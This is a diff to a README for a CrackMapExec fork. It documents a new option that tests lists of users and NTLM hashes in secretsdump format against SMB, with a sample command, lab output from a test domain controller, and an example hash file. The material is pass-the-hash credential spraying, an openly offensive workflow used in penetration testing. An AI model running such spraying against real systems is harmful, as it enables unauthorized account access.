@@ -3,12 +3,13 @@
 # CrackMapExec fork to include features
 
 ## Features Added
-** Test user and hashes from file with "secretdump" format (-uH parameter) **
 
-### Example:
+### Test users and hash pairs from file(s) in "secretdump" format (-uH parameter)
+The idea is to be able to take file(s) with multiple lines with useres and respective NTLM hashes in "secretdump" formatting, and test those using SMB for example againist another domain, or to retest these credentials obtained before to see if they are still working. The parameter -d <domain> is required.
 
+** Example: **
 ```
-(CrackMapExec) ~/t/CrackMapExec> cme smb 192.168.56.100 -d ramlab -uH ../hashes.txt
+(CrackMapExec) ~/t/CrackMapExec> cme smb 192.168.56.100 -d ramlab -uH hashes.txt
 SMB         192.168.56.100  445    DC01             [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC01) (domain:ramlab) (signing:True) (SMBv1:True)
 SMB         192.168.56.100  445    DC01             [-] ramlab\testuser22 4139c3eafc40242c4317313ea08d00b7 STATUS_LOGON_FAILURE 
 SMB         192.168.56.100  445    DC01             [-] ramlab\aaandy 4b291acc6fd3ae12f92ec3e587ab5abe STATUS_LOGON_FAILURE 
@@ -18,6 +19,18 @@ SMB         192.168.56.100  445    DC01             [-] ramlab\btoaan 0c391a86d1
 SMB         192.168.56.100  445    DC01             [+] ramlab\testuser3 4139c3eafc40242c4317313ea08d00b7 
 SMB         192.168.56.100  445    DC01             [+] ramlab\testuser2 85a165727adfbd6550626d515e4e1ef3 
 SMB         192.168.56.100  445    DC01             [-] ramlab\btoaan 0c391a86d139b2a17cf3260a06387558 STATUS_LOGON_FAILURE 
+```
+
+hashes.txt example file:
+```
+testuser22:1110:aad3b435b51404eeaad3b435b51404ee:4139c3eafc40242c4317313ea08d00b7:::
+bbbbb\aaandy:1116:aad3b435b51404eeaad3b435b51404ee:4b291acc6fd3ae12f92ec3e587ab5abe:::
+testuser2:1110:aad3b435b51404eeaad3b435b51404ee:85a165727adfbd6550626d515e4e1ef3:::
+bbbbbb\mnfffi:1141:aad3b435b51404eeaad3b435b51404ee:70e81ac21b3b2aedf0b4b601a6226d2d:::
+bbbbbb\btoaan:1148:aad3b435b51404eeaad3b435b51404ee:0c391a86d139b2a17cf3260a06387558:::
+aaaaaa\testuser3:1111:aad3b435b51404eeaad3b435b51404ee:4139c3eafc40242c4317313ea08d00b7:::
+testuser2:1110:aad3b435b51404eeaad3b435b51404ee:85a165727adfbd6550626d515e4e1ef3:::
+bbbbbb\btoaan:1148:aad3b435b51404eeaad3b435b51404ee:0c391a86d139b2a17cf3260a06387558:::⏎   
 ```
 
 # Acknowledgments
